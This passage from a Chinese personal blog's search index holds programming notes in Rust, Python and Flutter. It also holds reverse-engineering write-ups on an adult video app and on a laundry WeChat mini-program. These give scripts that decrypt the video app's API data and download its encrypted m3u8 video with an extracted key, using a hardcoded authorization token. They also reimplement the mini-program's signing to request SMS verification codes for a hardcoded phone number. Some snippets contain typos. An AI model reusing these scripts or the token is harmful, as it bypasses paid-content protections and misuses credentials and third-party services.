a.iter().filter(|\u0026amp;u| !b.contains(u)).collect::\u0026lt;Vec\u0026lt;_\u0026gt;\u0026gt;(); println!(\u0026#34;a 和 b 差集是：{:?}\u0026#34;, minusion); // 取并集 let union = a .iter() .filter(|\u0026amp;u| !b.contains(u)) .chain(\u0026amp;b) .collect::\u0026lt;Vec\u0026lt;_\u0026gt;\u0026gt;(); println!(\u0026#34;a 和 b 并集是：{:?}\u0026#34;, union); // 取补集 let complement = a .iter() .filter(|\u0026amp;u| !b.contains(u)) .chain(b.iter().filter(|\u0026amp;u| !a.contains(u))) .collect::\u0026lt;Vec\u0026lt;_\u0026gt;\u0026gt;(); println!(\u0026#34;a 和 b 补集是：{:?}\u0026#34;, complement); } lyric and add_pic\r#\ruse metaflac::Tag; use metaflac::block::PictureType::Media; #[tokio::main] async fn main() -\u0026gt; Result\u0026lt;(), reqwest::Error\u0026gt;{ let lyc=\u0026#34;[00:09.74]群青色の空\\n[00:11.88]自由なんてものは\\n[00:14.02]手を伸ばすほどに遠く遠く飛んでく\\n[00:16.80]ほら、海猫の歌が僕を笑っているんだ\\n[00:21.28]夏の島に縛られた十六年間\\n[00:25.08]長い前髪も伸び過ぎて捨てられたあの日みたい\\n[00:29.32]どんな愛情も\\n[00:30.50]ねえ、たったひと切れのパンより軽い（ライト）\\n[00:32.80]生きているよ\\n[00:34.43]神様にもきっと見捨てられている僕でも\\n[00:40.10]追い風に白い帆を上げよう\\n[00:43.92]君が留まり僕がゆくなら\\n[00:47.76]いつか遠い海で会えるんだろう\\n[00:51.56]きっとこの星はまあるいから\\n[00:55.40]追い風に白い帆を上げよう\\n[00:59.14]君が留まり僕がゆくなら\\n[01:02.88]いつか遠い海で会えるんだろう\\n[01:06.78]きっとこの星はまあるいから\\n[01:25.62]潮の香りが染み込んでいる日だ\\n[01:29.76]薄汚れた白い背中を押す風が吹いた\\n[01:33.68]もし叶うなら愛されたいな\\n[01:37.52]あたたかな胸に頰を埋め眠りたいな\\n[01:41.38]雲を追うよ、風を切るマスト\\n[01:45.02]僕を乗せた船はどこまでも\\n[01:48.72]黄金島にもゆけるよ\\n[01:50.60]地図はないけど\\n[01:52.32]さあ、人魚たちの歌に手を叩こう\\n[01:56.54]ナナナ……\\n[02:11.53]追い風に白い帆を上げよう\\n[02:15.30]君が留まり僕がゆくなら\\n[02:19.16]いつか遠い海で会えるんだろう\\n[02:22.92]きっとこの星はまあるいから\\n[02:26.94]追い風に白い帆を上げよう\\n[02:30.48]君が留まり僕がゆくなら\\n[02:34.24]いつか遠い海で会えるんだろう\\n[02:38.16]きっとこの星はまあるいから\\n[02:47.54]まあるいから\\n[02:55.42]まあるいから\\n\u0026#34;; let mut tag = Tag::read_from_path(\u0026#34;C:/test/rust/demo1/file/wcat.flac\u0026#34;).unwrap(); let data=reqwest::get(\u0026#34;https://p2.music.126.net/mog628G4JLNEMi-GpWxccQ==/109951164647211717.jpg\u0026#34;).await?.bytes().await?.to_vec(); tag.add_picture(\u0026#34;image/jpeg\u0026#34;, Media, data); let comment=tag.vorbis_comments_mut(); comment.set_lyrics(vec![lyc]); tag.save().unwrap(); Ok(()) } "},{"id":106,"href":"/posts/python-notes/","title":"python Notes","section":"Blog","content":"\r清华源\r#\rpip install -i https://pypi.tuna.tsinghua.edu.cn/simple model linux中python2和3的pip python{2,3} -m pip install xxx Base64\r#\rimport base64 import string base64.b64decode() #解码 base64.b64encode() #编码 处理变表base64 str1 = \u0026#34;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==\u0026#34; #解码字符串 string1 = \u0026#34;TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; #变换后的码表 string2 = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; print(base64.b64decode(str1.translate(str.maketrans(string1,string2)))) 正则\r#\r取AB中间字符\n(?\u0026lt;=A).*?(?=B) #不包含AB A.*?B #包含AB A.*?(?=B) #包含A不包含B import re re.findall(r\u0026#34;(?\u0026lt;=A).*?(?=B)\u0026#34;,str) n位字符取一次\nre.findall(r\u0026#39;.{2}\u0026#39;,str) requests\r#\rimport requests url=\u0026#39;http://example.com\u0026#39; data={\u0026#39;example\u0026#39;:\u0026#39;123\u0026#39;} # data 即from-data header={\u0026#39;User-Agent\u0026#39;:\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47\u0026#39;} #header 请求头 proxy={\u0026#39;http\u0026#39;:\u0026#39;127.0.0.1:7890\u0026#39;,\u0026#39;https\u0026#39;:\u0026#39;127.0.0.1:7890\u0026#39;} #设置代理 # from-data result=requests.post(url,data=data,headers=header) # 发起一个post请求 # 发送json # result=requests.post(url,json=data,headers=header) result.status_code=\u0026#39;utf-8\u0026#39; #设置编码，一般无需 print(result.text) #返回文本内容 print(result.json()) # 解析json，得到字典 print(result.content) # 获得二进制内容，如mp3，常用写入文件 print(result.headers) 线程池\r#\rfrom concurrent.futures import ThreadPoolExecutor def test(x): pass with ThreadPoolExecutor(max_workers=5) as t: for x in range(10): t.submit(test,x) hash\r#\rimport hashlib m = hashlib.md5() m.update(b\u0026#39;123\u0026#39;) m.hexdigest() hashlib.md5(b\u0026#39;123\u0026#39;).hexdigest() hashlib.new(\u0026#39;md5\u0026#39;, b\u0026#39;123\u0026#39;).hexdigest() 指定md5结尾\nimport hashlib i=0 while 1: i+=1 if hashlib.md5(str(i).encode()).hexdigest()[-6:]==\u0026#39;1cf45b\u0026#39;: print(i) break try\r#\r捕获所有异常\ntry: print(num) except Exception as e: print(\u0026#39;产生错误了\u0026#39;,e) JSON\r#\rimport json json.loads(str) josn.dumps(json) time\r#\rfrom datetime import datetime time=\u0026#39;Tue, 06 Sep 2022 03:26:46 GMT\u0026#39; dd=\u0026#39;r\u0026#39;%a, %d %b %Y %H:%M:%S GMT\u0026#39; print(date.strptime(dd,time)) ouput: 20200906112646 然后在小时上加8 xpath\r#\rfrom lxml import etree e=etree.HTML(res) u=e.xpath(path) execjs\r#\rimport execjs with open(\u0026#39;js1.js\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;utf-8\u0026#39;) as fp: js1=fp.read() print(execjs.compile(js1).call(\u0026#39;e\u0026#39;,\u0026#39;cat\u0026#39;)) # e为函数名,cat为传参 Crypto\r#\rAES ECB pkcs7\nfrom Crypto.Cipher import AES import base64 from Crypto.Util.Padding import pad, unpad MODE = AES.MODE_ECB PAD_STYLE = \u0026#39;pkcs7\u0026#39; ENCODING = \u0026#39;UTF-8\u0026#39; key=\u0026#39;l8N2iooyp07M9IWa\u0026#39; def encrypt(plaintext: str, key: str) -\u0026gt; str: key_bytes = key.encode(ENCODING) cipher = AES.new(key_bytes, MODE) plaintext_bytes = plaintext.encode(ENCODING) plaintext_bytes_padded = pad(plaintext_bytes, AES.block_size, PAD_STYLE) ciphertext_bytes = cipher.encrypt(plaintext_bytes_padded) ciphertext_base64_bytes = base64.b64encode(ciphertext_bytes) ciphertext = ciphertext_base64_bytes.decode(ENCODING) return ciphertext def decrypt(ciphertext: str, key: str) -\u0026gt; str: key_bytes = key.encode(ENCODING) decrypter = AES.new(key_bytes, MODE) ciphertext_base64_bytes = ciphertext.encode(ENCODING) ciphertext_bytes = base64.b64decode(ciphertext_base64_bytes) plaintext_bytes_padded = decrypter.decrypt(ciphertext_bytes) plaintext_bytes = unpad(plaintext_bytes_padded, AES.block_size, PAD_STYLE) plaintext = plaintext_bytes.decode(ENCODING) return plaintext from Crypto.Cipher import DES,AES,PKCS1_v1_5 from Crypto.PublicKey import RSA import base64 def add(text,L=16): l=len(text) if l\u0026lt;L: text=text+\u0026#39;\\0\u0026#39;*(L-l) elif l\u0026gt;L: text=text+\u0026#39;\\0\u0026#39;*(L-l%L) return text.encode() def AES_encrypt(clear,key,iv): aes=AES.new(add(key),2,add(iv)) return base64.b64encode(aes.encrypt(add(clear))).decode() def AES_decrypt(cipher,key,iv): aes=AES.new(add(key),2,add(iv)) return aes.decrypt(base64.b64decode(cipher.encode())).decode().replace(\u0026#39;\\0\u0026#39;,\u0026#39;\u0026#39;) def DES_encrypt(clear,key): des=DES.new(add(key,8),DES.MODE_ECB) return base64.b64encode(des.encrypt(add(clear,8))).decode() def RSA_encrypt(clear): # 公钥加密，只能用对应的私钥解密，反之 rsa_key = RSA.import_key(open(\u0026#34;key.pem\u0026#34;).read()) cipher = PKCS1_v1_5.new(rsa_key) return base64.b64encode(cipher.encrypt(clear.encode(\u0026#39;utf-8\u0026#39;))).decode() def RSA_encrypt(): pass print(RSA_encrypt(\u0026#39;3jtdV+uOwJU=\u0026#39;)) RC4\nimport base64 from urllib.parse import quote def rc4_main(key = \u0026#34;init_key\u0026#34;, message = \u0026#34;init_message\u0026#34;): # print(\u0026#34;RC4加密主函数\u0026#34;) s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return crypt def rc4_init_sbox(key): s_box = list(range(256)) # print(\u0026#34;原来的 s 盒：%s\u0026#34; % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(\u0026#34;混乱后的 s 盒：%s\u0026#34;% s_box) return s_box def rc4_excrypt(plain, box): # print(\u0026#34;调用加密程序成功。\u0026#34;) res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = \u0026#34;\u0026#34;.join(res) print(\u0026#34;加密后的字符串是：\u0026#34; ,quote(cipher)) return (str(base64.b64encode(cipher.encode(\u0026#39;utf-8\u0026#39;)), \u0026#39;utf-8\u0026#39;)) pyqt打包\r#\rpyinstaller "},{"id":107,"href":"/posts/flutter/","title":"flutter","section":"Blog","content":"\r起因\r#\r放假在家闲的皮爆，有空学习写了个（其实在很久之前就有打算了） 因为网易云音乐下载有很多但是加密的，虽然可以解密，但是也不方便管理，所以就有了这个软件，可以嵌入元数据（mp3和flac），包括歌词封面等。同步网易云歌单，可以删除本地文件\n开发\r#\r至于学习flutter，最开始知道flutter是因为逆向系列了解到的，听说写ui很方便，之前也有用过java开发。java的语法还也不是很喜欢。 网易云的api 参考: NeteaseCloudMusicApi\n学习编程语言我不是很喜欢看视频来，慢得很，需要什么直接去搜代码就行了。 先看看官方的文档，demo，自己需要什么功能直接百度 虽然可能了解不深刻，但是跟着视频写代码更烦人\n使用\r#\r设置里面要先设置cookie，只需要cookie中的MUSIC_U的部分，以及保存路径，这个保存路径是歌单的保存路径，如果下载的话会根据歌单名为文件夹保存在下级。\n元数据默认嵌入所有\n先根据歌单id获取歌曲，若要下载需要收藏歌单，下载完成会检测本地歌单中多余歌曲并徐闻是否删除。\n似乎就这点鸟功能\n"},{"id":108,"href":"/posts/%E6%9F%90h%E8%A7%86%E9%A2%91-mls/","title":"某H视频-mls","section":"Blog","content":"\r分析流程\r#\r这个软件呢，其实分析主要就是想要看他拉人获得vip的操作\n抓包可以找到一个api\napi/user/traveler 这之前token还没有得到，参数\n{\u0026#34;deviceId\u0026#34;: device, \u0026#34;dev\u0026#34;: 随机3字符, \u0026#34;code\u0026#34;: \u0026#39;{\u0026#34;p\u0026#34;:\u0026#34;PDTVPD\u0026#34;}\u0026#39;} 这个code参数其实开始我也不知道是啥，走了一遍拉人的流程，发现app给我们的邀请链接有p参数，就是邀请码\nhttps://z6mhir31k.xyz?p=PDTVPD 在进到网页中点击下载软件会将邀请码复制到我们的粘贴板上\n{\u0026#34;p\u0026#34;:\u0026#34;PDTVPD\u0026#34;} 当你进入app时，读取粘贴板的第一条数据\npublic static String u() { ClipData v0 = FragmentAnim.f.getSystemService(\u0026#34;clipboard\u0026#34;).getPrimaryClip(); String v1 = \u0026#34;\u0026#34;; if(v0 != null \u0026amp;\u0026amp; v0.getItemCount() \u0026gt; 0) { CharSequence v0_1 = v0.getItemAt(0).getText(); if(TextUtils.isEmpty(v0_1)) { return v1; } else { return v0_1.toString(); } } return v1; } deviceId\r#\r顺着上去就发现了deviceId的生成\npublic final void C() { String v0_2; String v3_1; String v1 = \u0026#34;everb\u0026#34;; String v2 = \u0026#34;\u0026#34;; if(a.a.exists()) { try { ObjectInputStream v0_1 = new ObjectInputStream(new FileInputStream(a.a)); Object v3 = v0_1.readObject(); try { v0_1.close(); goto label_21; } catch(Exception v0) { } } catch(Exception v0) { v3_1 = v2; } Log.d(v1, v0.toString()); } else { v3_1 = v2; } label_21: if(v3_1 == null) { Log.d(v1, \u0026#34;data == null\u0026#34;); v3_1 = v2; } if(TextUtils.isEmpty(((CharSequence)v3_1))) { v0_2 = String.valueOf(System.currentTimeMillis() + UUID.randomUUID().getLeastSignificantBits()); try { byte[] v0_4 = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(v0_2.getBytes()); StringBuilder v1_1 = new StringBuilder(); int v5; for(v5 = 0; v5 \u0026lt; v0_4.length; ++v5) { String v6 = Integer.toHexString(v0_4[v5] \u0026amp; 0xFF); if(v6.length() \u0026lt; 2) { v1_1.append(0); } v1_1.append(v6); } v3_1 = v1_1.toString(); } 他会打开是个名为.CAD的文件，把deviceid写进去,如果像要看一遍生成新device，记得删除这个文件\n但是我却没有搞懂这个deviceID的鉴别方法，你自己随便改一两位他都不会返回，看不懂\n下面是用python模拟生成的deviceid\nimport uuid,hashlib,unpack t = int(time.time()*1000) uuid_bytes = uuid.uuid1().bytes leastbit = struct.unpack(\u0026#39;\u0026gt;q\u0026#39;, uuid_bytes[8:])[0] print(leastbit) v4 = hashlib.md5(str(t+leastbit).encode()).digest() v2 = [] for i in v4: v1 = hex(i \u0026amp; 0xFF)[2:] if len(v1) \u0026lt; 2: v1 = \u0026#34;0\u0026#34;+v1 v2.append(v1) device = \u0026#39;\u0026#39;.join(v2) 这个几把最低64位真的搞得烦，没见过\n里面其实还有个chcode不知道是啥\npublic JSONObject c(String arg5, String arg6) { this.a(\u0026#34;deviceId\u0026#34;, arg5); Random v5 = new Random(); StringBuffer v0 = new StringBuffer(); int v1; for(v1 = 0; v1 \u0026lt; 3; ++v1) { v0.append(\u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#34;.charAt(v5.nextInt(62))); } this.a(\u0026#34;dev\u0026#34;, v0.toString()); if(arg6 != null) { this.a(\u0026#34;code\u0026#34;, arg6); } try { arg5 = FragmentAnim.f.getPackageManager().getApplicationInfo(FragmentAnim.f.getPackageName(), 0x80).metaData.getString(\u0026#34;UMENG_CHANNEL\u0026#34;); } catch(PackageManager$NameNotFoundException ) { arg5 = \u0026#34;\u0026#34;; } StringBuilder v6 = new StringBuilder(); v6.append(\u0026#34;--------------\u0026gt;\u0026#34;); v6.append(arg5); String v0_1 = \u0026#34;渠道号：\u0026#34;; Log.e(v0_1, v6.toString()); if(!TextUtils.isEmpty(((CharSequence)arg5)) \u0026amp;\u0026amp; !arg5.equals(FragmentAnim.A())) { this.a(\u0026#34;chCode\u0026#34;, arg5); Log.e(v0_1, \u0026#34;chCode--------------\u0026gt;\u0026#34; + arg5); } return b.b; } header\r#\r在上面那个api中header中的s和t\nimport time,hashlin t=str(int(time.time()*1000)) s=hsahlib.md5(t[3:8].encode()).hesdigest() 到最后我发现妈的这软件好像也不加头，我的vip啊，也有可能是我哪里遗漏了些什么\n注意ua,没带或者ua有问题都不会返回token，我在网上找的爬虫ua就不行，用模拟器自己生成的ua就行\n个人里面那个填写invitecode的地方好像也是摆设\nencData\r#\r在后面返回数据里encData是有加密的，aes/cbc/pkcs7,key和iv都是一样的\nJhbGciOiJIUzI1Ni m3u8解密\r#\rm3u8文件解密，得到的m3u8文件里的key是假的\n看了几个关于m3u8的类\n会找到getkeyPath这个方法\nkey是在本地文件kdbc/kb里，把key copy出来\n配合N_m3u8DL-CLI可以下载m3u8文件\n打印N_m3u8DL-CLI的命令,视频存放在Videos目录\ndef download(): id = \u0026#39;1570\u0026#39; # 143811 # 24323 t = str(int(time.time()*1000)) header = {\u0026#39;deviceid\u0026#39;: \u0026#39;ac6819db96c1892587d63f353bd9a51c\u0026#39;, \u0026#39;t\u0026#39;: t, \u0026#39;s\u0026#39;: hashlib.md5(t[3:8].encode()).hexdigest(), \u0026#39;authorization\u0026#39;: \u0026#39;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMzMzNjQwNyIsImlzcyI6IiIsImlhdCI6MTY3MTI3NTY5NCwibmJmIjoxNjcxMjc1Njk0LCJleHAiOjE4Mjg5NTU2OTR9.766BQyjE6ZO5ZPC5Y6J0i5BZKmezUk7CXYo-cStNp_w\u0026#39; } res = requests.get( f\u0026#39;https://mhapp.vxxsred.xyz/api/video/getVideoById?videoId={id}\u0026#39;, headers=header).json() # print(res) data = res[\u0026#39;encData\u0026#39;] data = AES_decrypt(data, \u0026#39;JhbGciOiJIUzI1Ni\u0026#39;, \u0026#39;JhbGciOiJIUzI1Ni\u0026#39;) print(data) data = json.loads(data) print(data[\u0026#39;videoUrl\u0026#39;]) print(\u0026#39;\u0026#34;https://nwretbns.yongchengge.cn/\u0026#39; + data[\u0026#39;videoUrl\u0026#39;]+r\u0026#39;\u0026#34; --workDir \u0026#34;C:\\Users\\xx\\Videos\u0026#34; --useKeyFile \u0026#34;C:\\Users\\xx\\Desktop\\N_m3u8DL-CLI_v3.0.2_with_ffmpeg_and_SimpleG\\key\\kb\u0026#34;\u0026#39;) # https://videossy.tsk12.top/lfb/5c/5h/8n/rv/fb43cc643014465380e4c222aa60fb30.m3u8/ # lfb/5c/5h/8n/rv/fb43cc643014465380e4c222aa60fb30.m3u8 # \u0026#34;https://nwretbns.yongchengge.cn/lfb/5c/5h/8n/rv/fb43cc643014465380e4c222aa60fb30.m3u8\u0026#34; --workDir \u0026#34;E:\\tools\\other\\N_m3u8DL-CLI_v3.0.2_with_ffmpeg_and_SimpleG\u0026#34; --useKeyFile \u0026#34;C:\\Users\\jinchuan\\Desktop\\N_m3u8DL-CLI_v3.0.2_with_ffmpeg_and_SimpleG\\key\\kb\u0026#34; # https://nwretbns.yongchengge.cn/lfb/5c/5h/8n/rv/fb43cc643014465380e4c222aa60fb30.m3u8 "},{"id":109,"href":"/posts/%E6%9F%90%E6%B4%97%E8%A1%A3%E5%B0%8F%E7%A8%8B%E5%BA%8F/","title":"某洗衣小程序","section":"Blog","content":"\r小程序逆向\r#\r抓包\n电脑版微信最新版抓不了包，用3.7.6一下的\n微信在登陆时，右上角把代理填上\n把AppData\\Roaming\\Tencent\\WeChat\\XPlugin\\Plugins里面的东西删了，不影响使用\n解密\n下载aen516954023/wxappUnpacker: 微信小程序本地应用包逆向工具 (github.com)\n解密wxapkg文件，在C:\\Users\\xxx\\Documents\\WeChat Files\\Applet\n在解密的时候出现各种几把问题，均可参考百度，google等\n可能因为解密不出来wml和wss不能动态调试很难受\nwxapkg文件解包\n其他的单独解\n逆向\n因为没有拿到wml和wss，所以只能静态分析\n还好比较简单\n​\t因为不能调试，不知道最后一个sign传的什么参数，是做的md5\nimport requests import execjs phone=\u0026#39;17628818007\u0026#39; url=\u0026#39;https://www.sharewash.cn/saywash/WashCallApi/common/user/requestVerifyCode.api\u0026#39; data={\u0026#39;phoneNumber\u0026#39;:phone,\u0026#39;ssid\u0026#39;:\u0026#39;\u0026#39;,\u0026#39;tokenId\u0026#39;:\u0026#39;\u0026#39;,\u0026#39;sign\u0026#39;:\u0026#39;\u0026#39;} with open(\u0026#39;../js/2.js\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;utf-8\u0026#39;) as fp: js1=fp.read() ssid=execjs.compile(js1).call(\u0026#39;getTime\u0026#39;) data[\u0026#39;ssid\u0026#39;]=ssid data[\u0026#39;sign\u0026#39;]=execjs.compile(js1).call(\u0026#39;getsign\u0026#39;,ssid,phone) print(data) function getsign() { var i, g = arguments; i = { \u0026#39;phoneNumber\u0026#39;: \u0026#39;17628818007\u0026#39;, \u0026#39;ssid\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;tokenId\u0026#39;: \u0026#39;\u0026#39; } return i.ssid = getTime(), i.tokenId = false || \u0026#34;\u0026#34;, i.sign = sign(i) } function r(r) { var a = new Array(), n = r.length, s = parseInt(n / 4), f = n % 4, o = 0; for (o = 0; o \u0026lt; s; o++) a[o] = e(r.substring(4 * o + 0, 4 * o + 4)); return f \u0026gt; 0 \u0026amp;\u0026amp; (a[o] = e(r.substring(4 * o + 0, n))), a; } function e(r) { var e = r.length, a = new Array(64), n = 0, s = 0, f = 0, o = 0; if (e \u0026lt; 4) { for (n = 0; n \u0026lt; e; n++) { var c = r.charCodeAt(n); for (s = 0; s \u0026lt; 16; s++) { var t = 1, l = 0; for (l = 15; l \u0026gt; s; l--) t *= 2; a[16 * n + s] = parseInt(c / t) % 2; } } for (f = e; f \u0026lt; 4; f++) { c = 0; for (o = 0; o \u0026lt; 16; o++) { t = 1, l = 0; for (l = 15; l \u0026gt; o; l--) t *= 2; a[16 * f + o] = parseInt(c / t) % 2; } } } else for (n = 0; n \u0026lt; 4; n++) { c = r.charCodeAt(n); for (s = 0; s \u0026lt; 16; s++) { t = 1; for (l = 15; l \u0026gt; s; l--) t *= 2; a[16 * n + s] = parseInt(c / t) % 2; } } return a; } function a(r) { var e; switch (r) { case \u0026#34;0000\u0026#34;: e = \u0026#34;0\u0026#34;; break; case \u0026#34;0001\u0026#34;: e = \u0026#34;1\u0026#34;; break; case \u0026#34;0010\u0026#34;: e = \u0026#34;2\u0026#34;; break; case \u0026#34;0011\u0026#34;: e = \u0026#34;3\u0026#34;; break; case \u0026#34;0100\u0026#34;: e = \u0026#34;4\u0026#34;; break; case \u0026#34;0101\u0026#34;: e = \u0026#34;5\u0026#34;; break; case \u0026#34;0110\u0026#34;: e = \u0026#34;6\u0026#34;; break; case \u0026#34;0111\u0026#34;: e = \u0026#34;7\u0026#34;; break; case \u0026#34;1000\u0026#34;: e = \u0026#34;8\u0026#34;; break; case \u0026#34;1001\u0026#34;: e = \u0026#34;9\u0026#34;; break; case \u0026#34;1010\u0026#34;: e = \u0026#34;A\u0026#34;; break; case \u0026#34;1011\u0026#34;: e = \u0026#34;B\u0026#34;; break; case \u0026#34;1100\u0026#34;: e = \u0026#34;C\u0026#34;; break; case \u0026#34;1101\u0026#34;: e = \u0026#34;D\u0026#34;; break; case \u0026#34;1110\u0026#34;: e = \u0026#34;E\u0026#34;; break; case \u0026#34;1111\u0026#34;: e = \u0026#34;F\u0026#34;; } return e; } function n(r) { for (var e = \u0026#34;\u0026#34;, n = 0; n \u0026lt; 16; n++) { for (var s = \u0026#34;\u0026#34;, f = 0; f \u0026lt; 4; f++) s += r[4 * n + f]; e += a(s); } return e; } function s(r, e) { var a = k(e), n = f(r), s = new Array(32), b = new Array(32), i = new Array(32), w = 0, v = 0, A = 0, y = 0, h = 0; for (A = 0; A \u0026lt; 32; A++) s[A] = n[A], b[A] = n[32 + A]; for (w = 0; w \u0026lt; 16; w++) { for (v = 0; v \u0026lt; 32; v++) i[v] = s[v], s[v] = b[v]; var g = new Array(48); for (y = 0; y \u0026lt; 48; y++) g[y] = a[w][y]; var p = c(l(t(c(o(b), g))), i); for (h = 0; h \u0026lt; 32; h++) b[h] = p[h]; } var I = new Array(64); for (w = 0; w \u0026lt; 32; w++) I[w] = b[w], I[32 + w] = s[w]; return u(I); } function f(r) { for (var e = new Array(64), a = 0, n = 1, s = 0; a \u0026lt; 4; a++, n += 2, s += 2) for (var f = 7, o = 0; f \u0026gt;= 0; f--, o++) e[8 * a + o] = r[8 * f + n], e[8 * a + o + 32] = r[8 * f + s]; return e; } function o(r) { for (var e = new Array(48), a = 0; a \u0026lt; 8; a++) e[6 * a + 0] = 0 == a ? r[31] : r[4 * a - 1], e[6 * a + 1] = r[4 * a + 0], e[6 * a + 2] = r[4 * a + 1], e[6 * a + 3] = r[4 * a + 2], e[6 * a + 4] = r[4 * a + 3], e[6 * a + 5] = 7 == a ? r[0] : r[4 * a + 4]; return e; } function c(r, e) { for (var a = new Array(r.length), n = 0; n \u0026lt; r.length; n++) a[n] = r[n] ^ e[n]; return a; } function t(r) { for (var e = new Array(32), a = \u0026#34;\u0026#34;, n = [[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7], [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8], [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0], [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]], s = [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10], [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5], [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15], [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]], f = [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8], [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1], [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7], [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]], o = [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15], [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9], [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4], [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]], c = [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9], [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6], [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14], [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]], t = [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11], [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8], [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6], [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]], l = [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1], [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6], [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2], [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]], u = [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7], [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2], [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8], [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]], k = 0; k \u0026lt; 8; k++) { var i, w; switch (i = 2 * r[6 * k + 0] + r[6 * k + 5], w = 2 * r[6 * k + 1] * 2 * 2 + 2 * r[6 * k + 2] * 2 + 2 * r[6 * k + 3] + r[6 * k + 4], k) { case 0: a = b(n[i][w]); break; case 1: a = b(s[i][w]); break; case 2: a = b(f[i][w]); break; case 3: a = b(o[i][w]); break; case 4: a = b(c[i][w]); break; case 5: a = b(t[i][w]); break; case 6: a = b(l[i][w]); break; case 7: a = b(u[i][w]); } e[4 * k + 0] = parseInt(a.substring(0, 1)), e[4 * k + 1] = parseInt(a.substring(1, 2)), e[4 * k + 2] = parseInt(a.substring(2, 3)), e[4 * k + 3] = parseInt(a.substring(3, 4)); } return e; } function l(r) { var e = new Array(32); return e[0] = r[15], e[1] = r[6], e[2] = r[19], e[3] = r[20], e[4] = r[28], e[5] = r[11], e[6] = r[27], e[7] = r[16], e[8] = r[0], e[9] = r[14], e[10] = r[22], e[11] = r[25], e[12] = r[4], e[13] = r[17], e[14] = r[30], e[15] = r[9], e[16] = r[1], e[17] = r[7], e[18] = r[23], e[19] = r[13], e[20] = r[31], e[21] = r[26], e[22] = r[2], e[23] = r[8], e[24] = r[18], e[25] = r[12], e[26] = r[29], e[27] = r[5], e[28] = r[21], e[29] = r[10], e[30] = r[3], e[31] = r[24], e; } function u(r) { var e = new Array(64); return e[0] = r[39], e[1] = r[7], e[2] = r[47], e[3] = r[15], e[4] = r[55], e[5] = r[23], e[6] = r[63], e[7] = r[31], e[8] = r[38], e[9] = r[6], e[10] = r[46], e[11] = r[14], e[12] = r[54], e[13] = r[22], e[14] = r[62], e[15] = r[30], e[16] = r[37], e[17] = r[5], e[18] = r[45], e[19] = r[13], e[20] = r[53], e[21] = r[21], e[22] = r[61], e[23] = r[29], e[24] = r[36], e[25] = r[4], e[26] = r[44], e[27] = r[12], e[28] = r[52], e[29] = r[20], e[30] = r[60], e[31] = r[28], e[32] = r[35], e[33] = r[3], e[34] = r[43], e[35] = r[11], e[36] = r[51], e[37] = r[19], e[38] = r[59], e[39] = r[27], e[40] = r[34], e[41] = r[2], e[42] = r[42], 